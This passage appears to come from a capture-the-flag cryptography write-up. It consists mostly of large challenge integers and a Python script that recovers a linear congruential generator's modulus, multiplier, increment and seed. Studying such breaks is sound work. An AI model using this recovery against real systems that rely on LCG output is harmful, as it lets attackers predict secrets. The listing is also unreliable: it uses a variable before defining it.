class="number">3573404320052684865673874549697641892027200012970524599604344629480614428866510201242482244849851484812706779763531318294257649114967750248177266575351904</span>, <span class="number">9842046015326295936713113278372276623162309027668703544974484877511676105923564214126300248193166116770085089143956697998095520184839701995830786470588119</span>, <span class="number">1064336683929673294424950894292146984741870122993750747944221503261933086121633737427851706261755403775672810611025441884538303946056267106936423845713730</span>, <span class="number">6119365214772078724433453740633652395125857443726005119583473831076384223906106649768079888760939037051562253507550245597366168645023889061250894710116872</span>, <span class="number">5602011006464577820650860273674214314948301394399362583056956812763168470596401011938904716955876179317142179854200420737178701879845622918970728218817949</span>, <span class="number">10688806197588176452780872184778027232553550269662452778559914264819143186851703377917866670279816566644466846812573511478521598670666245892196227297170402</span>, <span class="number">5749904848759330691912891772384327613924997567829966591570364086794022755761818695314980583632637028499235341576195664559034461478739838517698995139240520</span>, <span class="number">1473933381482644649246484684948491018110461317434958015735226919261712432035368580090492745146416337225430662664884870906265846689475144165741263419385905</span>, <span class="number">3552860753236534406946271949447053351616262867581225480251433378405395606162241270360794601150221505524887454619865625159396521192722639689825266164326816</span>, <span class="number">4025679965704249310939546887743143184778491366293564444733040608202385243934512959804528152567307183957923258841546784019979277638486471342137039310318604</span>, <span class="number">1428306100235018482450198029802616624310450179792798438669479546266596806004602176194588533054495773950160676878470790570132527471839589294782804506864441</span>, <span class="number">8072640850617110855241510299723015162827596185892374204250158932214085926781337179437786602123040219341501746957277147294211685494391786439998863901089893</span>, <span class="number">2290057280367999932259137216825281879413132565849987663338198789524712754992858321893466864733387202649315380456638047854477096168544359491803121243688000</span>, <span class="number">5583776997173032351635208701832518352809786960319795099887625543547183445391810022036790072533037112330349602788093182421751334721766510178242249083764627</span>, <span class="number">5555512621486935858457469521156983776299061091073590635447092107028704208540406733047475719028715045501507903325457398941934254799046940278325310033482933</span>, <span class="number">7665423408493304559035871431129989913357233723249175120897904121412582167441209612658706772501336565843970245726584617492252916378077133678386752447479662</span>, <span class="number">8831387806623653368662340193363376330252742297757679694064336031013050629164883790422491632189245291105141480142691855687788119534960055111937208761779764</span>, <span class="number">2348888614969242586632516586799444957926744624366807832492236485549208397119705715567513397392975902694704991295169187766291349081368111899560720396912163</span>, <span class="number">10451697705774524889255333562630749622276186482567115240625444048980008730091781659382447964280974139805714329640013256846296616477415783127806162072491149</span>, <span class="number">3250053095409795441799567001241905982447028127895768914842011332740981667697922880047939854625934995462431986184579852033575425135296743961724555021553181</span>, <span class="number">9499810476412190124599031127163816885315637762750874334393511360938998873472806644408465489819096250688914013976242877525460146303183679634674370610160694</span>, <span class="number">92257121750173787195460287712066480674189420505795777943741841246701964816851362584581887732119504356154538047167987960370209222391456428961345119032809</span>, <span class="number">12269893351335732220619942414611484122117650937343569742545802327578718253718985310842132315303704593709644293158237815585049455555135510973664199958693798</span>, <span class="number">4854713676085574526662356579768501638557898917664535692967710778955911366151402816643274844610774778935107487406502370514549614685656866640401239202834102</span>, <span class="number">9656855196981957286865007955477554547059961250711019730968709842838157159677727374063090954692895414472966936147114719942275698429255550218956155962518443</span>, <span class="number">10148197872461036653889170589960841138898378162938634118741365043648210887779860640879042773763373401039437782724679433103797938447652210218046301321938137</span>, <span class="number">12461232655674858104051817101902990616915757003991956969221908635021591516205957656336468897180110175709862262579877525493916685242872024155795348828400176</span>, <span class="number">11515492235427136169798424725612219236309642991625654371183731730027788023368799576473412684138684541479647895019245640398756194511932236210019079278656202</span>, <span class="number">9312723419754943857232652740523874103277584545494275166317053355215205988412434914584577068344668904923765987915402028853045934303862656336563244048246523</span>, <span class="number">3434383108470049029053666008815308531590134792871525168902104045958390857925829496103793826034582372819627900181087747849310099323713159750797436731923978</span>, <span class="number">2052825789517422745957370721388573723182830509538514420501723815481790762140713599082002354654158294047326674932865012220392363486715578383070467708932910</span>, <span class="number">10770872913090420263826876160012447606018440578288754515724315559071314423506980193977270893366351744377445642366389285439123580143916270246988741122493660</span>, <span class="number">3565988622227549084653994809440615920798581997796422558559355800295965356685917449272144672382620500366078282458866458096806308728686228192532033445531518</span>, <span class="number">7987937603217906772125351267418794200095217108807309149562138708773233299338480817569011892602088537590687786738273360905876877211262668458875082882458569</span>, <span class="number">4299751706784176820105715713539239270215624269772955083508652046435502139841633241153109045625048345605751183584593710474010228628095809207445826828301062</span>, <span class="number">10019327725978208236277427849923401464013536466834817004487325963890302290677170796473911285913485694471557407842663829711790012758636232851048197562076970</span>, <span class="number">5138403339358284697884990506322543562700235321736382747541248890065001571793729102717066426165866053641894094061304639478393033286059241545837832925687008</span>, <span class="number">10228090755344960970679747531229256367160327180359671541949607264521381518553697635523334685658730563057199104095247245691811898629769883344461751738921690</span>, <span class="number">6938402205879718649643358194974950463903056291457329419119162151731390866418293772450507112272848076046486599581272976892364724913119152308769085352795367</span>, <span class="number">11280255720158022430121620544392035006266764932889864093174004075437976799530373518170066458122923542435209793375705211355694698012831668504105946460564772</span>, <span class="number">10650080319228068163548466605116849530751339026717564400609682888875984174584984784963847899953214337418229474398753727586147950082377211001219418727734531</span>, <span class="number">10461022182955578447294079762112754763429164916076790787112090719603654252896897448344420250021620176006659592981968554934943569081480419128363237489108104</span>, <span class="number">11294589811045347664304912724217788273217094365629355933705003484228821123827955195688346268644297234401605720721740926188866212623659856349759808546053573</span>, <span class="number">10141937561124400301982173279180416680599842235284290692072537579079974651828622761789618621457566636724264817395463634439628042740828226329973006978891186</span>, <span class="number">8699118787845988175954950830533895540464426675170903476797484684827478978776067185352151829468201077173776538174395364948214699466188452645619083202335397</span>, <span class="number">12490958061653463671303817402993043179356302996030558945084439266441544994731844973009447951262224179413736407979270443372343363290613996828606691161987252</span>, <span class="number">1024823052748991275918423605425827037473451549824180278380702661915820289501105769305592458213604304944573172116472138059298554754383765054848368834515334</span>, <span class="number">3149474298239740425894423050918867645630001944600705788108027769951125277410290754170234970933196247423050719031598422461389202024499050176806060679677640</span>, <span class="number">3425483968307644002385892058719086212716261772924539515575616780270386411164460702988525468502203695427847573359486165370995863584865024607875453113258244</span>, <span class="number">9705357328007201094979830114725957907301023647515885569874620519288750162367785332310027452079098270484040335976686397008724129688151547673302532800076127</span>, <span class="number">12528067279527694536201251429187719480507077254234508172928714722834454912280936520459764100380973964883571564905066513102812286630954907087130626346683494</span>, <span class="number">4939295221340286977967875420508917414648818020752361919936291655865071126761352698631110381573442349498218777369829854206818104532768049611248376832646359</span>, <span class="number">2674716557876676991359847674281575368289805356457334186233684389337165131924171023207759236886479042433988774018170513891058846936762285475702948844499055</span>, <span class="number">10349676289323318216282440188630692479357100195610794079000469485228064289679720223872904306548414937443200055514794128504939320273714041015087548204878153</span>, <span class="number">3900480819251156802400683860178242140508599285632000256139953374592431655484257091900097449715624009719169957853282262679600053131204952434804975419266157</span>, <span class="number">2936159796121585099460866869138570695590259507075990700680474293606587115834002606755454671199622928559535999084787402214470880864183436401195544493052669</span>, <span class="number">1910402964444746284044322396240628093197632493543757175428655391794593305368776891166511349255068918199319491778066276301997616045939664490448839333489777</span>, <span class="number">1994054049614957137012968886604855559867627865708330094634548251426006158033188269746591310955375650972289227494847138366482888524799108481062111707291092</span>, <span class="number">664156672277686579033231849080080037649291816954378169291815494575299687760501487195938458172766680345439694282832959763390366172814696710864218723261259</span>, <span class="number">12044194267239521602316930974641858743309642634849533309620090028794964787997699723555198411201425083423798765746532735264847882307790354623613697781026231</span>, <span class="number">3942539316360593180663464837869649035347833269370669444954316124093202605566882860780981381878784090092764043248538409214215435668807650324046261030953106</span>, <span class="number">2022207880686960702068864642666908666405232483184555226114281753353758352867196196619541592446344511643385335987267677037992230191517430032349313406786081</span>, <span class="number">1402014237680608398997541757664483469798911191731757908773293414891741210993904795137778388105953527158027010766967713019151683784055836714091379088238996</span>, <span class="number">12881637058943520423956901175941737505225045806296925357592011092034362689563279912911015222707490108931028304114733886174696720737566341300608005833745897</span>, <span class="number">4446045521099199793223577547105513509868334848725869867850590717318036002007864766205849908526861560477907094114731908043120644690316329932058243626812356</span>, <span class="number">6843700571901946528606304715672203413849264849459277102145538041815013380627558590652117209975927071389138841622127095630503721403593938867412536469987491</span>, <span class="number">13256848318143610462565698482052498172924849571765498593609128597128856288744955029403580962574277927166646836266532151877185351103195822664044510033562329</span>, <span class="number">8007697821447303394905163825963623638810259844261676281034344373436426075060169272367362853555194864409938774346873718610793473975936622478650660613171538</span>, <span class="number">3586649574568142335142000007519269169683528720968659015296196828181939727116591794102325463820915540711767580644590211490688908496713342802724330043476999</span>, <span class="number">2148119040689733972973040760742956506738676028795873896489234121475047906650516542446622516446652580015262674044616995261448674463155184722665447227004333</span>, <span class="number">9821340975603221880229361526669536689872783036813557603647771598331800920383857008030217981692547058985852914477757546352817156483366517574263281418049287</span>, <span class="number">5813002327804361264470951734172772898635650829156628675370575721244579958255509366900200447859958423075692155868720900356225705808715378593075570213485367</span>, <span class="number">7797546330955985239260874007700903991194636476790757497230960507273760017191030055855779426266128617165810023444274355865827356873670975494986772973549125</span>, <span class="number">6423309376854507951386722651575201498832084523844636913943763204639292900317424599429387036474652852527155873400886510187492547526250061669125362070048744</span>, <span class="number">2723152586748229745903509454334751207914828385965393570411858405764696535921255866269049955401523836912464812051633276478078278079367329876200075486862158</span>, <span class="number">13015397720497890352045605342327942324564547581996425748914656936552529102322496213513910991605691739714270616469070784054074203319779518842464992920350770</span>, <span class="number">8263750714072311979325622454139907993837044439909377414638039002083085784664971877156416417538871908573087847796602637123926505104604610909364895752078257</span>, <span class="number">9267773779254525056564451118318682125792816185104222973339351298641137957155502345583271175585245232019586303509714408650076668626619185504236159542187892</span>, <span class="number">6836655782419927384926585500839864398000979295056246948533536997678460444451885936375070616683594003406321130780418789653166843306713089441814025696068247</span>, <span class="number">8159919519373712666364879313578240235174260133692384793283692113895762771865201015732235336575594273425244597034248180447729832995339556990068559995962558</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n[<span class="number">30</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">x1 = <span class="number">8874937378716753576850453573789326249003541019039439656124625436218713023501508466125664186477683313567607343263520908371451243118020424774779416613284431</span></span><br><span class="line">x2 = <span class="number">2272952363017630559556957955923359020608484345799712462629628170648722715295981120790102876295983654085449309744008793129064000312354978267334570450316580</span></span><br><span class="line">x3 = <span class="number">2908005781806019194373618893842561631858638383291599116857909669689194340479675737346427303495425892274736979677443740297777253232987190979789663078725548</span></span><br><span class="line">x4 = <span class="number">3932085435203368987040270370169028458481400198383481987063012025485880158374650852938797303847848555222501161881776438272815556194118123494398521291295697</span></span><br><span class="line"></span><br><span class="line">x = [ x1, x2, x3, x4]</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(x)):</span><br><span class="line">    t.append(x[i] - x[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">mk = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t)-<span class="number">1</span>):</span><br><span class="line">    mk = GCD(t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>] - t[i]*t[i], mk)</span><br><span class="line">    <span class="built_in">print</span>(mk)</span><br><span class="line"><span class="built_in">print</span>(gcd(mk,mt))</span><br><span class="line">m=<span class="number">10916943396243271758266829435555189967315413084893315714705045128417174415341289341427433287377943483933876693839607971139318822507789476490876054697833171</span></span><br><span class="line">x1 = <span class="number">2904118189775120023459019968272518649734695395069048986022437844918703975644558115383392143444650105913452409637755020483723178514755099834451835881760669</span></span><br><span class="line">x2 = <span class="number">2496347446622649570739835604330702398623655492993517020989697292987597836476885607585376289637075420196735804815963859430002179996807900803924440985064670</span></span><br><span class="line">x3 = <span class="number">5092430706888567903864571522791342607274393841524837952939293151143112873052820889489487455424060318331863246280679543283523935851978590240976374837185862</span></span><br><span class="line">x4 = <span class="number">5841875905599158459362419364618142617028730211782981879796170746183188377680781214397263518308193221936236231314886272772334955629812227434225018741466206</span></span><br><span class="line"></span><br><span class="line">x = [ x1, x2, x3, x4]</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(x)):</span><br><span class="line">    t.append(x[i] - x[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">mt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t)-<span class="number">1</span>):</span><br><span class="line">    mt = GCD(t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>] - t[i]*t[i], mt)</span><br><span class="line">    <span class="built_in">print</span>(mt)</span><br><span class="line">a = gmpy2.invert(t[<span class="number">0</span>],m) * t[<span class="number">1</span>] % m</span><br><span class="line">b = (x[<span class="number">1</span>] - a*x[<span class="number">0</span>]) % m</span><br><span class="line">a_ = gmpy2.invert(a,m)</span><br><span class="line"></span><br><span class="line">seed = a_ * (x[<span class="number">0</span>] - b) % m</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    seed = a_ * (seed - b) % m</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;LCG 初始化参数: seed=<span class="subst">&#123;seed&#125;</span>\n a=<span class="subst">&#123;a&#125;</span>\n b=<span class="subst">&#123;b&#125;</span>\n m=<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">n=[<span class="number">3112694391042354926773258527503185381065155208766365770810259125227315858273584882915278974659442759713556138602562818381472824625797498323576227136840540</span>, <span class="number">786520206240723735172261009757420248240712167229385012959459782880298311452489264350397371063336640624230104453428663597776321434444090584610343945793660</span>, <span class="number">7754569747576675124444476463859698281135896797237129188325347781614403755633169372944514845375944974591833050594776051023970647718184479538589092026997450</span>, <span class="number">10978871322047154319303427738666909216134180533239441865527547245976955391170539397404213362987538079999656622797569425035497528648628186801889140680115470</span>, <span class="number">415184125088979230381868131662306705231430570032972141500815295250568658520820987452099753091555506318572984156087823561918067558858879113735437647918395</span>, <span class="number">9714366912431081171564906464961880471711707698812491599768023751085458677159777579545968149071317510381545022553352967040864616769551211477245295688346391</span>, <span class="number">8092371024146035837349997948385163397190707017788806800986026897219622319284668919277237868044873010504361887344482864009123696754405451607327057609111440</span>, <span class="number">10436585428619509784309464150307931296272516984470192973796220477752118208825366154709099054615564535911017032120309414411717936665468477272752593939807490</span>, <span class="number">447305603342948150664988784745387699519951434026852127837772145868706495519135216852266467924181573327190271412684871626668438866189143390133743425082693</span>, <span class="number">6258382789539676289638693392356433976508824529535654981585175361893403855873239591388514679492519869137377551632089436526817168965584123817538926883004415</span>, <span class="number">6578459280281502789276376530649184418554320975674197078167114333423000507810642180022772031856026530862489799383804073813561526139629854268000350585566612</span>, <span class="number">3105804271985778113444078016881015352567661906301742072344003729902592834090816086716179301421395002611330071836937959172008751915356371544312148285941397</span>, <span class="number">5127587678416216516561596462057578930989568244549184602544457582445902765146101086132777949114594616892034555102233884229669532953434325912113180385189591</span>, <span class="number">1681442924588151639116433276563473534451382602613595570895775581721843149401494979313072945423375889819333272799813140736767061166995345688865952524678847</span>, <span class="number">6078642869874003200723208932690378645034656959547344879427148548997772820000250634715135248051520273525771098588692142255436403818018608325143275974733955</span>, <span class="number">4012523361150861559330864221313828963018749453209042526129800867368717777138746796940156428780116853299962328653590275670160641449729061424004869739613567</span>, <span class="number">4087452535062195595067394274200281754153594561224879880591706612010600316823470426560921334571972319206745275769663537296296835581079110402423097667972149</span>, <span class="number">11987901353675361726480103030921089210449430771045316299988549316092607271793911250199421541491725415392936441323452384413917894329798638712720319592293030</span>, <span class="number">2904118189775120023459019968272518649734695395069048986022437844918703975644558115383392143444650105913452409637755020483723178514755099834451835881760669</span>, <span class="number">2496347446622649570739835604330702398623655492993517020989697292987597836476885607585376289637075420196735804815963859430002179996807900803924440985064670</span>, <span class="number">5092430706888567903864571522791342607274393841524837952939293151143112873052820889489487455424060318331863246280679543283523935851978590240976374837185862</span>, <span class="number">5841875905599158459362419364618142617028730211782981879796170746183188377680781214397263518308193221936236231314886272772334955629812227434225018741466206</span>, <span class="number">8822998220509619232900481169697664481537213687243135055737490918324236635625751932015349246530733060787880922400103357011039056263913931100456275760018751</span>, <span class="number">1829427301393099155994835313687991302426344894851330147851048073570161235032513979807480344356619367183014749159832405667673629599879026930073212395410824</span>, <span class="number">8874937378716753576850453573789326249003541019039439656124625436218713023501508466125664186477683313567607343263520908371451243118020424774779416613284431</span>, <span class="number">3094214719436429226961245919063208815398034554284969326313725322674015836263311873059825341599355295801961834907564360317827855287772012048456233770648414</span>, <span class="number">2272952363017630559556957955923359020608484345799712462629628170648722715295981120790102876295983654085449309744008793129064000312354978267334570450316580</span>, <span class="number">6496050086593645326490832279816459396921735500995471620086880796676279174314036559957741604751933054571983936020744588504368950464191967946656677942899021</span>, <span class="number">2908005781806019194373618893842561631858638383291599116857909669689194340479675737346427303495425892274736979677443740297777253232987190979789663078725548</span>, <span class="number">5388837765013859349244026248246407908254127661532056349880470355375929571123210403251766195449198851516630257699755053971912164119717459739252423955246030</span>, <span class="number">3932085435203368987040270370169028458481400198383481987063012025485880158374650852938797303847848555222501161881776438272815556194118123494398521291295697</span>, <span class="number">1596085666232061421423007114092508353792922600947831965835268732144143785280657330672864972239387627022937511560443766910692107622093754834918341508104599</span>, <span class="number">10892117681611280686941153150032271985229693373387407787226285542508269134168395045669092626668774409502094484729473636367607949115031549276342640669975082</span>, <span class="number">12381058972410501723509665604849175514380953105941348450275208477068514082229866560978025193499168665996771831648645890812123306116098698670457035525902659</span>, <span class="number">9545745033067721027306889070190247803420756540371596488987366683285356423973234015839573919673127328959418729409177485348542588655200727033820634115195595</span>, <span class="number">4479761395800283662690601296359321028679912967664335513079404387374415137823818474235937843015783541121766513461305964218999844148219102416295681398216273</span>, <span class="number">9156731911027542367340528717851854633542405024204364589600569440610994301305995711122403415955733016864883934476560189254464831525094631266907727317565841</span>, <span class="number">12666226165843230393234580593668809584406452210553760075587696529746311224658137054868869675868832265128577423471263099176912917347422711319558934937736129</span>, <span class="number">7737065667550567883921030156559155888807672386984437450593392652512287661221384706140560800013674012584773711581005691186997689622045412989344796050391287</span>, <span class="number">10722711925660632865003648114617468567460695864602168315375920133514224919874108904883202493206779150508025208748543209001260228655832044340651286693647050</span>, <span class="number">7221989584178899171245167344240261714028153334248896620632489515820094543095415471986280548321052175500724972199931711569861834778349006061026371650725530</span>, <span class="number">5886738574662494886015789010409089525104778409243680958758049475066582248064522621093649220502324554901044951352389897351932045257540701040679720673182995</span>, <span class="number">3233031164922457118197051143257856436060509168643015516594248999051329950677781355031891194479912736553900235538373437012785908680742480354059763051926316</span>, <span class="number">6920408828532601456551620626263287997391364853554222851307650268338227244737275020409310347012172074480549705970215944641795584739931068420792592364550052</span>, <span class="number">345138692120754413974989722062354894985124386853626820051983950290560303295350640053596083432413833430615738137403155513172015508429643499448532812238302</span>, <span class="number">6496124631023407996096728606763442237866253608920412620007859687219366730708253684245052162774841972751074153467713038103511069685477261845614949446512946</span>, <span class="number">4954508795303987697183186252875587490356341561311441407925804955497204676368654384148988141783982847353089058481160501471777024753759971112068258113214565</span>, <span class="number">3828140752986076468811884163754926568598858918798535569519010381565163308453577351104319634076150030767168383992404786769678070072803711746311572209192530</span>, <span class="number">1525344587067629160366462540930365317799240672047761683713335407426899660409450594374673147296233196946100880479779947899945565197770752720138099788100242</span>, <span class="number">5602028537128071394937385481766099952197676084096530706435200857779681493800600692877392655529445220731489748219807533708510871522082289298454440537081195</span>, <span class="number">8405125104396694306214164667837515476489019008711529371739198500339529156031577667955991513091455659686200628433501522614373035120915300556389897983235246</span>, <span class="number">9363664670977587308719921639117126893427493571952598074398598354833859096850631443468609493097644882813856223675425304811178510077132476076498042910645127</span>, <span class="number">9349867197915693633449346578490899128090370835059777452440405839315024154505729422754698383796886447011859369467724281722489773749407392509326759291555650</span>, <span class="number">3097954855336969231133966616412205217720272446131201205394739397914294852319995680869512637191028462644642196360432400206940604220726553888843484631971992</span>, <span class="number">7406758029368015050095014975336874387267990662428684874055990633074940508414476853156912578698644499480936056505695505471874708394209454863202578629044781</span>, <span class="number">5898320635400000335689178353860464283085294033102742946598413410403566655371101483965016006968842853067086240043017626407973320006397434327924399698861420</span>, <span class="number">3828259549886515897088733478568758658537872498350930339786355733127243099368094714942597822674100789401305391925244644463002021967786404115828714481532179</span>, <span class="number">10066554692829027637519103501291436097875302262643471195009455832708625591378453822850465340538716551878294551013391681787809106196783898118863498888850156</span>, <span class="number">3499720133059334106382868629152269068830644098994082476913546750309451292524899143926086345071167411724519536123368519961201709328076205428843169312885318</span>, <span class="number">1147510368324353143366569189557814239414538057284528926807572528742387641385961348284337024920835614354163427666397191709805222814485017032618600205989876</span>, <span class="number">1376443474120809546746657939759253350130433377066673914731313628744658444788621480850904944725428749861684141267366595703293257102033695543353727831255656</span>, <span class="number">1306141012932794251921296999513356011857879354957485278247781515633351554530888210035582022397642308827310053200134973752059059882857529726355628496875096</span>, <span class="number">413876320654674539071498590563731546775652768958703825687302348932338816891646970452489274333920514493304821523049953031604718378578195970800635452979649</span>, <span class="number">7136032318103206577710213656015300850977662493466951627466129080713148099950022004835515732817999372224984465182016765597112698961144220566693638971519180</span>, <span class="number">1756926746502930493055390730808057897946636149296690801994682335268478289364240082508380322318466774154683071200098564629218083632205594961758297148916941</span>, <span class="number">3316411454937759862626366549533032628711020533003169223587018450894240524473337491784683315945222404515083081588061970401834062233395245203672377474101840</span>, <span class="number">7599211346182071240062546116924978763380850815873927487248272261113823566573995151834356651681181867857513566992756113461907517519948807226796425859877955</span>, <span class="number">4827401360947748134984560117351749331549293418478129984842609599519150402230303738934321974655033540771922561714741710181107247544509276801554867550554777</span>, <span class="number">9961447244710994569376297896009391492177427465332112375195390069257789445371437839302033237974987420665106837111388126490588618960984274087531285094868463</span>, <span class="number">3970825380935714034877349217971517028903515186410921713051743479793055944068011846527177266662364107500948837234030225959118382828207676389015192534929256</span>, <span class="number">8608544722853283040859357355424248470567969517050350679760824632753430693341742456610190512333547560909838869247382450069074859055253804037930976168108964</span>, <span class="number">3997948190249595469689902562163983268236884055830515360341250116190801555461654583247875794079436239650479700066689264532083273326700382295037787195625271</span>, <span class="number">3017769504296172462769603649703609973556946564740463758564555635077678423150496052443226378694972314861078002173292765046041599543542556913918523347263353</span>, <span class="number">3018202344977285583885683841870491872320206187912942548780004839181579922416791687842887038054070620041342514501089785820834677670579439549543511926064647</span>, <span class="number">9891097413298322102982137409604486446161539669050452171012014240832941475729480282491230607708654307021437081745156282474575662423373832233207415281381073</span>, <span class="number">810743817397722331080383625060943517758354327434640227828749606831684964655697897139622679395918034416371573980787570599833348592060893531005764737629127</span>, <span class="number">1969958301963944803918256770227669804705344374646067381549018696813216352795715044244066646943740977361192247676332396646834038434975510833138637230427345</span>, <span class="number">772283527249875882597408338501459146497878473259395153877255706812399634121008456441522976339316844330687671179329753370897387217142932695296763732889342</span>, <span class="number">3493198662567460016868275788342486589147435611953915935411231579476989982638489118458485903871892142501116430468467002727878349586906097406405889235323788</span>, <span class="number">4521188033318754929745682253319078580979772923679656226706453809441157032758310389926223236904310972501023754771832793204339998846509477714808315607910281</span>, <span class="number">1459294332771505218116793124065248690329063109957541959485115472870135095063108761273775418742597190233931321103250699825789092987319750533970824729614370</span>, <span class="number">6081872280435119283055308076930153339025042098756094797625575179794067581927871061960272319874202717615426152212739549866438480879214105498282015894463289</span>, <span class="number">7762130387850161469171952821282759615477419337477617017933774362212895431284831425608213005612250003857841615618062878428976530194088816674767021581918361</span>, <span class="number">7088966648042419634447311723094936418341229460114395537643458905920051387153662615102678231749704070491616519620338946004408977647690235277763140459513851</span>, <span class="number">8530607388577471706676549252322039165843846873546376646134620680688465635242428455911769685950893069368467175196898490905630827271869358438258138367147920</span>, <span class="number">8175683960847863703233560555156381607096304894990424846512919663587601289791899748077484807672241130846328052701521081221552165331340951019312677944858747</span>, <span class="number">2488623773922039763673766132557696145161284575280912275615079393811226460826881195363265124937419976718725662680265519090252785095524620609995052703783900</span>, <span class="number">6288863230409343367237321449257176176239557761363343791530360335256224431868618032002438377834667134601271040364141807479673109178951459313279813775639777</span>, <span class="number">1473263923409842234507369539073445638835827020429470695919107120414932038000731541162435599563211189312718420865785265955929068440558364834918540634523353</span>, <span class="number">10122097127617668407198385940571219425968555754180743969424837212320822902467269904796129323894867285839753668577231263726601359268499019654139049664492061</span>, <span class="number">1334784462377268162219916937778259079061709480108638225731209555525977073101039827877859407920878225806740943290613416505735060002712675764508538108047998</span>, <span class="number">12943474412664177820782360094982469843501041500422827324429596710070670418547139028323568955260840820805331899161092350732997070023024881720076933509023643</span>, <span class="number">5285767084748000524025756084248068414482830127641006763000905479085771014780726785155236576771987096323025767003001338650450684709507257843571038471056162</span>, <span class="number">11001649396182899266919450751411831463050029968134347011876378247881245085871285736635385336564047956680944211929032745371792404308823898143896080599228135</span>, <span class="number">1301320300483174681160013837223931621343934678403403829386521051889935307860390561329187310217511171817846283842794896111380527530069209283005624028690286</span>, <span class="number">1186915169823582113649731511008826333372778559188698285519935265619430618324050874482684013915987326600510246581904647268399723862559309332791209147350358</span>, <span class="number">7951498363952334154675185909940847757383581919338786100530712059201526109293278830582032249111527249008525526574896069298049360688844794969204346487119319</span>, <span class="number">5833834084743172317761925197221701570183986273711410703784510000739316288591047658081863870594678124768673286740095552226723863847255410312004390417932230</span>, <span class="number">250924904422407061995835179415107794137513805961258172932861317085785803121995475899378133391840809508281610679076388256556411152107191872088591037125680</span>, <span class="number">7085080737844307190711404281467289397811408278819313361734199078382373564224746415235216310673951063158139882956733288219404303997318855194384556303070508</span>, <span class="number">792899170302377369245819488181982727852356501237495658820211983447692560703122438829983042374409125728040070525543893080924041158974511859677083096607042</span>, <span class="number">527158028815181308607570985361245658684704283756590449588667033857582910233360333000310180939827834980467750511349128724495152296557091872597733881952730</span>, <span class="number">3763863417935228217913891578022090207665435628108842338881001530218617625267294739809241731373814499577113686300212286948743727581910857164406047073435145</span>, <span class="number">958455575406045524652006754606401195502921703814444942723242685507533790960715001629170021188825054149374588782230350772396669475019050028532264494574237</span>, <span class="number">9809663619882688389709117706867480374978776635047144310439126194904691403735820159227260919973742961860862039967431466740149997606037421959899675267867402</span>, <span class="number">4928087822912964183306632018065153773912015339056263025033437531290833406852527367467717772039503136111382784824674765619106999131274189533695412345998781</span>, <span class="number">3306590088110759567187299302153921492468384287750726848496785861124840118140562928463000437634919111218431272400680022915536959360708451855996593223449881</span>, <span class="number">2515345284450486657989564309908638223504506708787471236561574408125887414773177664899850115276078830612044843742665254526234379016665896380411170870041898</span>, <span class="number">6134916597901963206086108654185719639522683238742250523950368120774398123587375425774449196409974448759099480799449712533937282087807450665513782605062516</span>, <span class="number">267008464052948389884730662677557220200174254262230501579203365622730336383874495035799286519129165799047086431118526490317359253783923412623429268099578</span>, <span class="number">3800295810128139174303610558671254854105124434132150757436144235620260340163872195459646695446468969827264408515318839301568024785647250539243955185201551</span>, <span class="number">2758490331762821125743858402061695095981818993449415737628690206586999472874851271575996243559646503027769536546139985948732741074951448605054447471168011</span>, <span class="number">4217864104379220244652908183473678097829823483575612233951544943703293030152224382038691961310245629042826444658756962561354248059403145303196082085209268</span>, <span class="number">2411546292849014551581200422109249129122050947218550703776810780058841000449832253829636107587459795899860908579554012266416092559036860375897058675166409</span>, <span class="number">192467681052352162362648778226726733093735914360336666620608894524451640254072987304183265625190436964732828104328784706266808876860847345878920907323799</span>, <span class="number">10212417168067454275584471588910621010044875852180765650348231827095954171511730230293551305771510545238294425677591538289639404143154924489749365048876082</span>, <span class="number">6291496406676715628304428700100747835536008647518931914594365410721760743785935426363197093622520575550738520057474256623894578595520825692491818636334669</span>, <span class="number">1696976360861070329626849480960267540656072393087503300209873513633034266528003865510158759809700233902230575591392391573852821509573062950235240813129994</span>, <span class="number">1992791476006726756711658531188332687379120992528518705617488065186657920940258074136462208677189526448735990314312679768851854906262932750351345930936464</span>, <span class="number">3434817150940057687962615407673182936576770534551677026510420824040773940701984366644277648090615900140073539389288521085696480983123237694035190924420756</span>, <span class="number">1327855956090181552782945714409707635753546680351411598218049923377836087099012280676631016119197258537564513914523176743684952405144923872921314136129035</span>, <span class="number">5655624154789660915581443648297353167129398768268548216939084854177411698912475597846603256287206167209756880556116572180333055932759436594462434353693400</span>, <span class="number">8830059371095862735354543958775333718886412721521896475178007834620722932782486718721540179680672790557809311631084845372799308539284214436640810453484170</span>, <span class="number">1577636678261904797628136271897055906695035001433916913766563447593237424148338744133061689583362391559327011278037905021569850425130860531043753400763154</span>, <span class="number">1209729863382992194970404071607689320320688269277129054249972346057995988562627526632203534824706401031451800965862577190219536998333754410251454193172633</span>, <span class="number">10994737712981198858904493523119510510407890704351172608352260610483503932115022636292742662488652484884065872585569714312792595965194541878114072128785076</span>, <span class="number">13312794948135247102302068858829637693388469161937738162205887768730544767479875477575282537997374804153016347963677479862069345296678731832716900899603869</span>, <span class="number">879671866755667260350450894660321566144270667616606636933510913412039991903800808345026765023248799436411333541403195209188109276098614860327117137466333</span>, <span class="number">5997701046258297701008758042981450104850958281608082374179429160139658833748115292822230978073016551491127587310846341263896220866877950242984465975300314</span>, <span class="number">4192012991959368360991053529958905352101679048106150398842439746093082099247853769361916275353786757483092523746395483254419836006982430015840596420354690</span>, <span 